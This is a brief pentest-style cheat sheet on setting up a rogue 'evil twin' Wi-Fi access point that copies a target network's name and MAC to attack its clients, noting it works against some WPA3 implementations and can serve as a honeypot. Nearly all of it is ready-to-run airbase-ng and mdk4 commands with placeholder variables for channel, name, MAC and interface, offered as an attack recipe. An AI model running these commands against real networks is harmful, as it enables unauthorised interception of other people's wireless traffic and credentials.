Set up access point with the same name as target access point. Targeted attack against a client. Can also be used as a honeypot.
Will work with some implementations of WPA3.

airbase-ng -c $channel -e $ap_name -a $ap_mac -Z 4 -W 1 $interface

Fast Response AP

airbase-ng -e $ap_name -c $channel -a $ap_mac -Z 2 -W 1 $interface

Channel hopping

mdk4 $interface b -n $ap_name -m -s 100 -w a
